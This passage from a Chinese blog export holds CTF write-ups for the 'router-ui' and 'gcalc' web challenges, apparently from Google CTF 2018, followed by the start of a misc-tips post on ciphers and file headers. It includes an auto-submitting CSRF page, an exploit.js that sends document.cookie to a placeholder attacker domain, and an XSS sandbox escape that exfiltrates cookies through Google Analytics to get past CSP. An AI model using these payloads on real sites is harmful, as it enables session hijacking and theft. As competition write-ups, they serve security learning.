class=\"line\">login:&lt;script src=https:</span><br><span class=\"line\">password:[YOURDOMAIN]/exploit.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=https://YOURDOMAIN/exploit.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>由于管理员只会查看邮件，所以需要先构建一个能够自动登录的website.html。</p>\n<p>website.html:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE HTML&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">\t&lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class=\"line\">\t&lt;title&gt;Cats&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;form method=&quot;POST&quot; action=&quot;https://router-ui.web.ctfcompetition.com/login&quot;&gt;</span><br><span class=\"line\">\t\t&lt;input name=&quot;username&quot; value=&quot;&amp;lt;script src=https:&quot;&gt;</span><br><span class=\"line\">\t\t&lt;input name=&quot;password&quot; value=&quot;[YOURDOMAIN]/exploit.js&amp;gt;&amp;lt/script&amp;gt;&quot;&gt;</span><br><span class=\"line\">\t&lt;/form&gt;</span><br><span class=\"line\">\t&lt;script&gt;</span><br><span class=\"line\">\t\tdocument.forms[0].submit();</span><br><span class=\"line\">\t&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>这样，当管理员点击该页面之后，就会自动登录，从而执行我们的payload。</p>\n<p>exploit.js:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.location.href=&apos;https://[YOURDOMAIN]/log.php?&apos;+document.cookie;</span><br></pre></td></tr></table></figure>\n<h2 id=\"gcalc\"><a href=\"#gcalc\" class=\"headerlink\" title=\"gcalc\"></a>gcalc</h2><p>app.js</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> e = <span class=\"string\">\"function\"</span> == <span class=\"keyword\">typeof</span> <span class=\"built_in\">Object</span>.assign ? <span class=\"built_in\">Object</span>.assign : <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a, b</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> c = <span class=\"number\">1</span>; c &lt; <span class=\"built_in\">arguments</span>.length; c++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> d = <span class=\"built_in\">arguments</span>[c];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (d)</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> f <span class=\"keyword\">in</span> d) <span class=\"built_in\">Object</span>.prototype.hasOwnProperty.call(d, f) &amp;&amp; (a[f] = d[f])</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> a</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    g = <span class=\"string\">\"function\"</span> == <span class=\"keyword\">typeof</span> <span class=\"built_in\">Object</span>.defineProperties ? <span class=\"built_in\">Object</span>.defineProperty : <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a, b, c</span>) </span>&#123;</span><br><span class=\"line\">        a != <span class=\"built_in\">Array</span>.prototype &amp;&amp; a != <span class=\"built_in\">Object</span>.prototype &amp;&amp; (a[b] = c.value)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    h = <span class=\"string\">\"undefined\"</span> != <span class=\"keyword\">typeof</span> <span class=\"built_in\">window</span> &amp;&amp; <span class=\"built_in\">window</span> === <span class=\"keyword\">this</span> ? <span class=\"keyword\">this</span> : <span class=\"string\">\"undefined\"</span> != <span class=\"keyword\">typeof</span> global &amp;&amp; <span class=\"literal\">null</span> != global ? global : <span class=\"keyword\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">k</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (a) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> b = h, c = [<span class=\"string\">\"Object\"</span>, <span class=\"string\">\"assign\"</span>], d = <span class=\"number\">0</span>; d &lt; c.length - <span class=\"number\">1</span>; d++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> f = c[d];</span><br><span class=\"line\">            f <span class=\"keyword\">in</span> b || (b[f] = &#123;&#125;);</span><br><span class=\"line\">            b = b[f]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        c = c[c.length - <span class=\"number\">1</span>];</span><br><span class=\"line\">        d = b[c];</span><br><span class=\"line\">        a = a(d);</span><br><span class=\"line\">        a != d &amp;&amp; <span class=\"literal\">null</span> != a &amp;&amp; g(b, c, &#123;</span><br><span class=\"line\">            configurable: !<span class=\"number\">0</span>,</span><br><span class=\"line\">            writable: !<span class=\"number\">0</span>,</span><br><span class=\"line\">            value: a</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">k(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a || e</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">l</span>(<span class=\"params\">a, b, c, d, f</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.location = a;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.c = b;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.mdDialog = d;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.f = f;</span><br><span class=\"line\">    n(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    a = a.search();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (a.expr &amp;&amp; a.vars) <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> m = p(a.expr, a.vars);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.a = <span class=\"keyword\">this</span>.screen = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">        q(<span class=\"keyword\">this</span>, m);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.b.ans = <span class=\"built_in\">parseFloat</span>(m) || <span class=\"number\">0</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (v) &#123;</span><br><span class=\"line\">        q(<span class=\"keyword\">this</span>, <span class=\"string\">\"Error\"</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">l.$inject = [<span class=\"string\">\"$location\"</span>, <span class=\"string\">\"$http\"</span>, <span class=\"string\">\"$httpParamSerializer\"</span>, <span class=\"string\">\"$mdDialog\"</span>, <span class=\"string\">\"vcRecaptchaService\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">q</span>(<span class=\"params\">a, b</span>) </span>&#123;</span><br><span class=\"line\">    a.screen = a.a ? a.screen + b : b</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">n</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    a.screen = <span class=\"string\">\"0\"</span>;</span><br><span class=\"line\">    a.a = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    a.b = &#123;</span><br><span class=\"line\">        pi: <span class=\"number\">3.14159</span>,</span><br><span class=\"line\">        ans: <span class=\"number\">0</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">p</span>(<span class=\"params\">a, b</span>) </span>&#123;</span><br><span class=\"line\">    a = <span class=\"built_in\">String</span>(a).toLowerCase();</span><br><span class=\"line\">    b = <span class=\"built_in\">String</span>(b);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"regexp\">/^(?:[\\(\\)\\*\\/\\+%\\-0-9 ]|\\bvars\\b|[.]\\w+)*$/</span>.test(a)) <span class=\"keyword\">throw</span> <span class=\"built_in\">Error</span>(a);</span><br><span class=\"line\">    b = <span class=\"built_in\">JSON</span>.parse(b, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a, b</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (b &amp;&amp; <span class=\"string\">\"object\"</span> === <span class=\"keyword\">typeof</span> b &amp;&amp; !<span class=\"built_in\">Array</span>.isArray(b)) <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>.assign(<span class=\"built_in\">Object</span>.create(<span class=\"literal\">null</span>), b);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"string\">\"number\"</span> === <span class=\"keyword\">typeof</span> b) <span class=\"keyword\">return</span> b</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"keyword\">new</span> <span class=\"built_in\">Function</span>(<span class=\"string\">\"vars\"</span>, <span class=\"string\">\"return \"</span> + a))(b)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">r</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p(a.a, <span class=\"built_in\">JSON</span>.stringify(a.b))</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (b) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Error\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">t</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> b = <span class=\"keyword\">new</span> URL(<span class=\"string\">\"https://gcalc2.web.ctfcompetition.com\"</span>);</span><br><span class=\"line\">    b.pathname = <span class=\"string\">\"/\"</span>;</span><br><span class=\"line\">    b.searchParams.set(<span class=\"string\">\"expr\"</span>, a.a);</span><br><span class=\"line\">    b.searchParams.set(<span class=\"string\">\"vars\"</span>, <span class=\"built_in\">JSON</span>.stringify(a.b));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> b + <span class=\"string\">\"\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">l.prototype.permalink = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.mdDialog.show(<span class=\"keyword\">this</span>.mdDialog.alert(&#123;</span><br><span class=\"line\">        title: <span class=\"string\">\"Link\"</span>,</span><br><span class=\"line\">        htmlContent: t(<span class=\"keyword\">this</span>),</span><br><span class=\"line\">        ok: <span class=\"string\">\"Ok\"</span></span><br><span class=\"line\">    &#125;))</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">l.prototype.showCaptcha = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.mdDialog.show(&#123;</span><br><span class=\"line\">        contentElement: <span class=\"string\">\"#captchaDialog\"</span>,</span><br><span class=\"line\">        parent: angular.element(<span class=\"built_in\">document</span>.body)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">l.prototype.cloud = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = <span class=\"keyword\">this</span>.f.getResponse();</span><br><span class=\"line\">    a ? (<span class=\"keyword\">this</span>.c(&#123;</span><br><span class=\"line\">        method: <span class=\"string\">\"POST\"</span>,</span><br><span class=\"line\">        url: <span class=\"string\">\"/report\"</span>,</span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\">            expr: <span class=\"keyword\">this</span>.a,</span><br><span class=\"line\">            vars: <span class=\"built_in\">JSON</span>.stringify(<span class=\"keyword\">this</span>.b),</span><br><span class=\"line\">            recaptcha: a</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;), <span class=\"keyword\">this</span>.mdDialog.hide()) : alert(<span class=\"string\">\"Wrong captcha.\"</span>)</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">l.prototype.btnClick = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/[0-9.]/</span>.test(a)) q(<span class=\"keyword\">this</span>, a), <span class=\"keyword\">this</span>.a += a;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/[*\\/+%-]/</span>.test(a)) q(<span class=\"keyword\">this</span>, <span class=\"string\">\" \"</span> + a + <span class=\"string\">\" \"</span>), <span class=\"keyword\">this</span>.a += a;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/[(]/</span>.test(a)) q(<span class=\"keyword\">this</span>, <span class=\"string\">\" \"</span> + a), <span class=\"keyword\">this</span>.a += a;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/[)]/</span>.test(a)) q(<span class=\"keyword\">this</span>, a + <span class=\"string\">\" \"</span>), <span class=\"keyword\">this</span>.a += a;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"string\">\"\\u03c0\"</span> == a) q(<span class=\"keyword\">this</span>, <span class=\"string\">\" \\u03c0 \"</span>), <span class=\"keyword\">this</span>.a += <span class=\"string\">\" vars.pi\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">switch</span> (a) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"ac\"</span>:</span><br><span class=\"line\">            n(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"ans\"</span>:</span><br><span class=\"line\">            q(<span class=\"keyword\">this</span>, <span class=\"string\">\" Ans \"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.a += <span class=\"string\">\" vars.ans\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"=\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.a) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            a = r(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.a = <span class=\"keyword\">this</span>.screen = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">            q(<span class=\"keyword\">this</span>, a);</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.b.ans = <span class=\"built_in\">parseFloat</span>(a) || <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"pow\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.a) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            a =</span><br><span class=\"line\">                r(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">            a *= a;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.screen = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.a = <span class=\"built_in\">parseFloat</span>(a) || <span class=\"number\">0</span>;</span><br><span class=\"line\">            q(<span class=\"keyword\">this</span>, a);</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.b.ans = <span class=\"built_in\">parseFloat</span>(a) || <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"sqrt\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.a &amp;&amp; (a = <span class=\"built_in\">Math</span>.sqrt(r(<span class=\"keyword\">this</span>)), <span class=\"keyword\">this</span>.screen = <span class=\"string\">\"\"</span>, <span class=\"keyword\">this</span>.a = <span class=\"built_in\">parseFloat</span>(a) || <span class=\"number\">0</span>, q(<span class=\"keyword\">this</span>, a), <span class=\"keyword\">this</span>.b.ans = <span class=\"built_in\">parseFloat</span>(a) || <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">u</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    a.html5Mode(!<span class=\"number\">0</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u.$inject = [<span class=\"string\">\"$locationProvider\"</span>];</span><br><span class=\"line\">angular.module(<span class=\"string\">\"calcApp\"</span>, [<span class=\"string\">\"ngMaterial\"</span>, <span class=\"string\">\"ngMessages\"</span>, <span class=\"string\">\"ngSanitize\"</span>, <span class=\"string\">\"vcRecaptcha\"</span>]).controller(<span class=\"string\">\"CalcCtrl\"</span>, l).config(u);</span><br></pre></td></tr></table></figure>\n<p>漏洞点：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function p(a, b) &#123;</span><br><span class=\"line\">    a = String(a).toLowerCase();</span><br><span class=\"line\">    b = String(b);</span><br><span class=\"line\">    if (!/^(?:[\\(\\)\\*\\/\\+%\\-0-9 ]|\\bvars\\b|[.]\\w+)*$/.test(a)) throw Error(a);</span><br><span class=\"line\">    b = JSON.parse(b, function(a, b) &#123;</span><br><span class=\"line\">        if (b &amp;&amp; &quot;object&quot; === typeof b &amp;&amp; !Array.isArray(b)) return Object.assign(Object.create(null), b);</span><br><span class=\"line\">        if (&quot;number&quot; === typeof b) return b</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    return (new Function(&quot;vars&quot;, &quot;return &quot; + a))(b)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该函数用户处理参数a,b对应我们的参数expr, vars。只要能够绕过该过滤即可实现XSS。</p>\n<p>有问题的paylaod:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// alert(1) // Remove whitespaces by yourself</span><br><span class=\"line\">vars.pi.constructor.constructor(</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(97)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(108)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(101)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(114)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(116)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(40)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(49)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(41)</span><br><span class=\"line\">)()</span><br></pre></td></tr></table></figure>\n<p>如果没有<code>String(a).toLowerCase()</code>，那么该payload可行。</p>\n<p>基础paylaod:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0,&quot;alert(1)&quot;:0&#125;</span><br></pre></td></tr></table></figure>\n<p>使用上边的paylaod，我们可以执行alert()。</p>\n<p>接下来就是绕过CSP。</p>\n<p>CSP of /：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Security-Policy: default-src &apos;self&apos;; child-src https://sandbox-gcalc2.web.ctfcompetition.com/</span><br></pre></td></tr></table></figure>\n<p>CSP of  /static/calc.html:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Security-Policy: default-src &apos;self&apos;; frame-ancestors https://gcalc2.web.ctfcompetition.com/; font-src https://fonts.gstatic.com; style-src &apos;self&apos; https://*.googleapis.com &apos;unsafe-inline&apos;; script-src &apos;self&apos; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google-analytics.com https://*.googleapis.com &apos;unsafe-eval&apos; https://www.googletagmanager.com; child-src https://www.google.com/recaptcha/; img-src https://www.google-analytics.com;</span><br></pre></td></tr></table></figure>\n<p>我们看到<code>img-src https://www.google-analytics.com;</code></p>\n<p>那么就可以通过google-analystic获取cookie。</p>\n<p>首先申请google-analystic，得到tid=UA-121623607-1</p>\n<p>有效payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=hao123%27;document.querySelector(%27body%27).append(x)%22:0&#125;</span><br></pre></td></tr></table></figure>\n<p>最终payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=12344%27%2bencodeURIComponent(document.cookie);document.querySelector(%27body%27).append(x)%22:0&#125;</span><br></pre></td></tr></table></figure>\n<p>google-anaystic-console:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://analytics.google.com/analytics/web/?hl=zh-CN&amp;pli=1#/realtime/rt-event/a121623607w179580825p177873825/metric.type=5/</span><br></pre></td></tr></table></figure>\n"},{"title":"misc思路","date":"2018-05-07T03:05:07.000Z","_content":"\n1. 凯撒13世 rot13\n\n2. roqtp697t95j3 对应键盘下一行\n\n3. 栅栏密码\n\n   <!-- more -->\n\n4. 各种文件头\n\n   JPEG (jpg)，文件头：FFD8FF\n\n   PNG (png)，文件头：89504E47\n\n   GIF (gif)，文件头：47494638\n\n   TIFF (tif)，文件头：49492A00\n\n   Windows Bitmap (bmp)，文件头：424D\n\n   CAD (dwg)，文件头：41433130\n\n   Adobe Photoshop (psd)，文件头：38425053\n\n   Rich Text Format (rtf)，文件头：7B5C727466\n\n   XML (xml)，文件头：3C3F786D6C\n\n   HTML (html)，文件头：68746D6C3E\n\n   Email [thorough only] (eml)，文件头：44656C69766572792D646174653A\n\n   Outlook 